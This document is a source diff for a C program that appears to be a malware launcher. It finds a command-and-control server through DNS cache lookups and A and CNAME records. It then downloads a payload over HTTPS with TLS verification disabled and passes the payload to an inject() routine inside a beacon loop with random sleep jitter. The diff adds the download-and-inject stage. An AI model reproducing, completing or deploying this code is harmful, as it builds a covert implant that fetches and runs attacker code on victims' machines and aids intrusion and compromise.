@@ -1,4 +1,4 @@
-// cl.exe -DDEBUG launcher.c loader.c
+// cl.exe /MD -DDEBUG launcher.c loader.c /Fo..\..\obj
 #include "launcher.h"
 
 #define MAX_RECORDS 6
@@ -6,6 +6,110 @@
 #define DNS_PORT 53
 
 C2CHANNEL channel;
+
+struct MemoryStruct {
+    char *memory;
+    size_t size;
+};
+
+// Callback function to write received data to a dynamically growing buffer
+size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata)
+{
+    size_t realsize = size * nmemb;
+    struct MemoryStruct *mem = (struct MemoryStruct *)userdata;
+    
+    // Reallocate memory to fit the new data
+    char *ptr_realloc = realloc(mem->memory, mem->size + realsize + 1);
+    if (ptr_realloc == NULL)
+    {
+        dprintf("Memory allocation failed\n");
+        return 0;
+    }
+    
+    mem->memory = ptr_realloc;
+    memcpy(&(mem->memory[mem->size]), ptr, realsize);
+    mem->size += realsize;
+    mem->memory[mem->size] = '\0';
+    
+    return realsize;
+}
+
+// Todo: This was slapped together to work. Need to go over
+// cleanup routines
+// error checking
+// mem leaks
+void curl_get_file(struct MemoryStruct *buffer)
+{
+   struct MemoryStruct chunk;
+
+    // Stuff that will need to be free'd
+    CURL *curl = NULL;
+    chunk.memory = calloc(1,1);
+
+    // Initialize the "chunk" used to receive data
+    if (chunk.memory == NULL)
+    {
+        dprintf("Memory allocation failed\n");
+        return;
+    }
+    chunk.size = 0;  // No data yet
+    
+    curl = curl_easy_init();
+    if (curl)
+    {
+        char* target_server = calloc(512, 1);
+        if (!target_server)
+            goto cleanup;
+        snprintf(target_server, 511, "https://%s:%d/%ws", channel.c2_server_ip, channel.c2_server_port, (unsigned short*)channel.c2_server_url);
+        dprintf("Performing get request: %s\n", target_server);
+        curl_easy_setopt(curl, CURLOPT_URL, target_server);
+
+        // For errors
+        char errbuf[CURL_ERROR_SIZE];
+        curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errbuf);
+        errbuf[0] = 0;
+
+        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1);
+
+        // Set headers
+        //curl_easy_setopt(curl, CURLOPT_HTTPHEADER, clientinfo.client_headers);
+
+        // Disable SSL certificate verification
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+
+        // Specify the callback function to handle the response data
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
+
+        // Perform the request
+        CURLcode res = curl_easy_perform(curl);
+
+        if (res != CURLE_OK)
+        {
+            size_t len = strlen(errbuf);
+            dprintf("\nlibcurl: (%d) ", res);
+            if(len)
+            {
+                dprintf("IF:%s\n", errbuf);
+            }
+            else
+            {
+                long response_code;
+                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
+                dprintf("ELSE:%s\n", curl_easy_strerror(res));
+                dprintf("Response code: %ld\n", response_code);
+            }
+        }
+cleanup:
+        // Cleanup
+        dprintf("performing curl cleanup.\n");
+        curl_easy_cleanup(curl);
+    }
+    // Assign data received to passed-in buffer
+    buffer->memory = chunk.memory;
+    buffer->size = chunk.size;
+}
 
 // int get_dns_cache(char record_names[][NI_MAXHOST], int *record_count)
 // {
@@ -236,7 +340,7 @@ int get_dns_cache(char record_names[][NI_MAXHOST], int *record_count)
     while(pEntry && (count < MAX_RECORDS))
     {
         dprintf("%ws\n", pEntry->pszName);
-        wcsncpy((wchar_t*)record_names[count], pEntry->pszName, NI_MAXHOST/2);
+        wcsncpy((wchar_t*)record_names[count], pEntry->pszName, (NI_MAXHOST-1)/2);
         // strncpy(record_names[count], pEntry->pszName, NI_MAXHOST);
         pEntry = pEntry->pNext;
         count++;
@@ -291,6 +395,15 @@ void perform_dns_query(PCWSTR Name)
             dprintf("IPv4 Address: %s\n", channel.c2_server_ip);
             dprintf("TTL: %lu\n", channel.c2_server_port);
         }
+        if (DnsRecord->wType == DNS_TYPE_CNAME)
+        {
+            if (channel.c2_server_url)
+            {
+                free(channel.c2_server_url);
+            }
+            dprintf("CNAME record: %ws\n", (unsigned short*)DnsRecord->Data.CNAME.pNameHost);
+            channel.c2_server_url = (char*)wcsdup((const wchar_t*)DnsRecord->Data.CNAME.pNameHost);
+        }
     }
     DnsRecordListFree(QueryResult, DnsFreeRecordList);
 }
@@ -304,6 +417,7 @@ int main(int argc, char **argv)
 
     channel.c2_server_ip = NULL;
     channel.c2_server_port = 0;
+    channel.c2_server_url = NULL;
 
     unsigned long sleep_min = 1000;
     unsigned long sleep_max = 5000;
@@ -320,6 +434,7 @@ int main(int argc, char **argv)
     //     dprintf("WSAStartup failed.\n");
     //     return;
     // }
+    curl_global_init(CURL_GLOBAL_DEFAULT);
 
     // Perform DNS requests in a loop
     while (1)
@@ -329,12 +444,13 @@ int main(int argc, char **argv)
         if (channel.c2_server_port > 0)
         {
             // We successfully received a stager server info
-            unsigned long buffer_len;
-            unsigned char* buffer;
+            struct MemoryStruct data;
+            data.size = 0;
             // Still have to write this code:
-            // buffer = get_module_from_stager(channel.c2_server_ip, channel.c2_server_port, &buffer_len);
+            curl_get_file(&data);
             int PID = 4; // TODO
-            inject(PID, buffer, buffer_len);
+            dprintf("received data size: %zu\n", data.size);
+            inject(PID, data.memory, data.size);
         }
 
         // Move to the next record
@@ -343,6 +459,7 @@ int main(int argc, char **argv)
         // Pause between requests
         Sleep(JITTER(sleep_min, sleep_max));
     }
+    curl_global_cleanup();
     // WSACleanup();
 
     return 0;
